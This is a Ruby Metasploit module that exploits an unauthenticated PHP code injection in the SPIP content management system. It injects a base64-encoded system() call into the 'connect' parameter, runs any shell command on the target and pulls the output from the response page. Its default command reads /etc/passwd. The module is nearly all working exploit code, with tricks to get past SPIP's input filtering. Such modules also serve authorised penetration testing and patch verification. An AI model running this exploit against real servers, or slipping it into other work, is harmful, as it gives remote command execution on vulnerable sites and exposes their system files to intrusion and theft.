##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'base64'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SPIP Connect Parameter Injection',
			'Description'    => %q{
				This module exploits a PHP code injection in SPIP. The vulnerability
				exists in the connect parameter and allows an unauthenticated user
				to execute arbitrary commands with web user privileges. Branchs 2.0/2.1/3 are concerned.
				Vulnerable versions are < 2.0.21 & < 2.1.16 & < 3.0.3.
				The module has been tested successfully with SPIP 2.0.11/Apache on Ubuntu and Fedora.
			},
			'Author'          =>
				[
					'Arnaud Pachot',					#Initial discovery
					'Davy Douhine and Frederic Cikala',	#PoC
					'Davy Douhine',						#MSF module
				],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'BID', '54292' ],
					[ 'URL', 'http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la' ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 04 2012'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('SPIP_ROOT',[ true, 'SPIP root directory', '/']),
				OptString.new('CMD', [ true, 'The command to execute', 'cat /etc/passwd'])
			], self.class)
	end

	def run
		uri = datastore['SPIP_ROOT'] + '/spip.php'
		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		# very dirty trick !
		# the SPIP server answers an HTML page which contains the ouput of the executed command on target
		# to easily extract the command output a header and a trailer are used.
		# the whole thing (header + CMD + trailer) is base64 encoded to avoid spaces/special char filtering
		# the header and the trailer will be used later when displaying the result (print_status)
		cmd64   = Base64.urlsafe_encode64("echo \"-123-\";#{datastore['CMD']}\;echo \"-456-\";")

		# another dirty trick !
		# a character is added in the trailer to make the cmd64 string longer and avoid SPIP "=" filtering
		if cmd64.include?("=")
			cmd64   = Base64.urlsafe_encode64("echo \"-123-\";#{datastore['CMD']}\;echo \"-456--\";")
		end

		# the (trivial) vuln
		data_cmd = "connect=?><? system(base64_decode(#{cmd64}))?>"

		begin
			print_status("Attempting to connect to #{rhost}:#{rport}")

			res = send_request_cgi(
				{
					'uri'    => uri,
					'method' => 'POST',
					'data'   => data_cmd
				})
			if (res)
		# extracting the output of the executed command (using the dirty trick)
			result = res.body.to_s.split("-123-").last.to_s.split("-456-").first
				print_status("Output: #{result}")
			end
		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
	end
end
